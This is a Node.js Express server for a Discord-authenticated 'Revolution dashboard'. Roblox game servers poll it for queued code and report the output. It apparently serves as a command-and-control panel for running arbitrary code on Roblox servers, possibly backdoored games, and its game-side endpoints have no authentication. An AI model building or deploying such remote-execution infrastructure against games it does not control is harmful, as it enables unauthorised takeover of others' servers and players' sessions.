'use strict';

const express  = require('express');
const path     = require('path');
const fetch    = require('node-fetch');
const session  = require('express-session');
const config   = require('./config.json');

const app  = express();
const PORT = process.env.PORT || 5000;

const DISCORD_AUTH_URL   = 'https://discord.com/api/oauth2/authorize';
const DISCORD_TOKEN_URL  = 'https://discord.com/api/oauth2/token';
const DISCORD_ME_URL     = 'https://discord.com/api/users/@me';

app.use(express.json());
app.use(session({
  secret:            config.session.secret,
  resave:            false,
  saveUninitialized: false,
  cookie:            { maxAge: 7 * 24 * 60 * 60 * 1000 },
}));

const servers       = {};
const commands      = {};
const gameInfoCache = {};
const avatarCache   = {};

function serverOnline(sv) {
  return (Date.now() / 1000 - sv.lastSeen) < 15;
}

function ensureGame(gameId) {
  if (!servers[gameId])  servers[gameId]  = {};
  if (!commands[gameId]) commands[gameId] = {};
}

async function fetchGameInfo(gameId) {
  if (gameInfoCache[gameId]) return gameInfoCache[gameId];
  let name = 'Unknown Game', thumb = '';
  try {
    const r = await fetch(`https://games.roblox.com/v1/games?universeIds=${gameId}`, { timeout: 5000 });
    const d = await r.json();
    if (d.data && d.data[0]) name = d.data[0].name;
  } catch (_) {}
  try {
    const r2 = await fetch(
      `https://thumbnails.roblox.com/v1/games/icons?universeIds=${gameId}&size=150x150&format=Png&isCircular=false`,
      { timeout: 5000 }
    );
    const d2 = await r2.json();
    if (d2.data && d2.data[0]) thumb = d2.data[0].imageUrl;
  } catch (_) {}
  gameInfoCache[gameId] = { name, thumb };
  return gameInfoCache[gameId];
}

function requireAuth(req, res, next) {
  if (req.session.user) return next();
  res.redirect('/login');
}

app.use(express.static(path.join(__dirname, 'public'), { index: false }));

app.get('/login', (req, res) => {
  if (req.session.user) return res.redirect('/');
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/auth/discord', (req, res) => {
  const params = new URLSearchParams({
    client_id:     config.discord.clientId,
    redirect_uri:  config.discord.redirectUri,
    response_type: 'code',
    scope:         'identify',
  });
  res.redirect(`${DISCORD_AUTH_URL}?${params}`);
});

app.get('/auth/callback', async (req, res) => {
  const { code } = req.query;
  if (!code) return res.redirect('/login');

  try {
    const tokenRes = await fetch(DISCORD_TOKEN_URL, {
      method:  'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body:    new URLSearchParams({
        client_id:     config.discord.clientId,
        client_secret: config.discord.clientSecret,
        grant_type:    'authorization_code',
        code,
        redirect_uri:  config.discord.redirectUri,
      }),
    });
    const tokenData = await tokenRes.json();
    if (!tokenData.access_token) return res.redirect('/login?error=token');

    const meRes  = await fetch(DISCORD_ME_URL, {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const me = await meRes.json();

    if (!config.whitelist.includes(me.id)) {
      return res.redirect('/login?error=unauthorized');
    }

    req.session.user = {
      id:            me.id,
      username:      me.username,
      discriminator: me.discriminator,
      avatar:        me.avatar,
    };

    res.redirect('/');
  } catch (_) {
    res.redirect('/login?error=failed');
  }
});

app.get('/auth/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/login');
});

app.get('/api/me', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'unauthenticated' });
  res.json(req.session.user);
});

// ── Lua routes (no auth — called from Roblox server) ────────

app.post('/game/:gameId/server/:serverId/heartbeat', async (req, res) => {
  const { gameId, serverId } = req.params;
  const players = req.body.players || [];
  ensureGame(gameId);
  if (!gameInfoCache[gameId]) fetchGameInfo(gameId).catch(() => {});
  const info = gameInfoCache[gameId] || { name: 'Loading…', thumb: '' };
  servers[gameId][serverId] = {
    gameId, serverId, players,
    lastSeen:  Date.now() / 1000,
    gameName:  info.name,
    gameThumb: info.thumb,
  };
  res.json({ ok: true });
});

app.get('/game/:gameId/server/:serverId/commands', (req, res) => {
  const { gameId, serverId } = req.params;
  ensureGame(gameId);
  const pending = (commands[gameId][serverId] || [])
    .filter(c => c.status === 'pending')
    .map(c => ({ id: c.id, code: c.code }));
  res.json({ pending });
});

app.post('/game/:gameId/server/:serverId/commands/:cmdId/result', (req, res) => {
  const { gameId, serverId, cmdId } = req.params;
  const output = req.body.output || '';
  ensureGame(gameId);
  const list = commands[gameId][serverId] || [];
  const cmd  = list.find(c => c.id === cmdId);
  if (!cmd) return res.status(404).json({ error: 'not found' });
  cmd.status = 'done';
  cmd.output = output;
  res.json({ ok: true });
});

// ── Dashboard API (auth required) ───────────────────────────

app.get('/api/games', requireAuth, (req, res) => {
  const result = [];
  for (const [gameId, svMap] of Object.entries(servers)) {
    const info   = gameInfoCache[gameId] || { name: 'Loading…', thumb: '' };
    const online = Object.values(svMap).filter(serverOnline);
    if (!online.length) continue;
    result.push({
      gameId,
      gameName:  info.name,
      gameThumb: info.thumb,
      servers:   online.map(sv => ({ ...sv, online: true })),
    });
  }
  res.json(result);
});

app.get('/api/games/:gameId', requireAuth, (req, res) => {
  const { gameId } = req.params;
  if (!servers[gameId]) return res.status(404).json({ error: 'not found' });
  const info = gameInfoCache[gameId] || { name: 'Loading…', thumb: '' };
  res.json({
    gameId,
    gameName:  info.name,
    gameThumb: info.thumb,
    servers:   Object.values(servers[gameId]).map(sv => ({ ...sv, online: serverOnline(sv) })),
  });
});

app.get('/api/games/:gameId/servers/:serverId', requireAuth, (req, res) => {
  const { gameId, serverId } = req.params;
  const sv = (servers[gameId] || {})[serverId];
  if (!sv) return res.status(404).json({ error: 'not found' });
  res.json({ ...sv, online: serverOnline(sv) });
});

app.post('/api/exec', requireAuth, (req, res) => {
  const { gameId, serverId, code } = req.body;
  if (!gameId || !serverId || !code)
    return res.status(400).json({ error: 'missing fields' });
  ensureGame(gameId);
  if (!commands[gameId][serverId]) commands[gameId][serverId] = [];
  const id = String(Date.now());
  commands[gameId][serverId].push({ id, code, status: 'pending', output: '', ts: Date.now() / 1000 });
  res.json({ id });
});

app.get('/api/exec/:cmdId/result', requireAuth, (req, res) => {
  const { cmdId } = req.params;
  for (const svMap of Object.values(commands)) {
    for (const list of Object.values(svMap)) {
      const cmd = list.find(c => c.id === cmdId);
      if (cmd) return res.json({ status: cmd.status, output: cmd.output });
    }
  }
  res.status(404).json({ error: 'not found' });
});

app.get('/api/console/:gameId/:serverId', requireAuth, (req, res) => {
  const { gameId, serverId } = req.params;
  const list = (commands[gameId] || {})[serverId] || [];
  res.json(list.slice(-100));
});

app.get('/api/avatar/:userId', requireAuth, async (req, res) => {
  const userId = parseInt(req.params.userId, 10);
  if (isNaN(userId)) return res.status(400).end();
  if (avatarCache[userId]) {
    res.set('Content-Type', 'image/png');
    res.set('Cache-Control', 'public, max-age=300');
    return res.send(avatarCache[userId]);
  }
  try {
    const r      = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=48x48&format=Png&isCircular=false`,
      { timeout: 5000 }
    );
    const data   = await r.json();
    const imgUrl = data.data[0].imageUrl;
    const r2     = await fetch(imgUrl, { timeout: 5000 });
    const buf    = await r2.buffer();
    avatarCache[userId] = buf;
    res.set('Content-Type', 'image/png');
    res.set('Cache-Control', 'public, max-age=300');
    return res.send(buf);
  } catch (_) {
    const px = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
      'base64'
    );
    res.set('Content-Type', 'image/png');
    return res.send(px);
  }
});

// ── Dashboard pages (auth required) ─────────────────────────

app.get('/', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/game/:gameId/:serverId/', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'panel.html'));
});

app.listen(PORT, () => {
  console.log(`Revolution dashboard → http://localhost:${PORT}`);
});
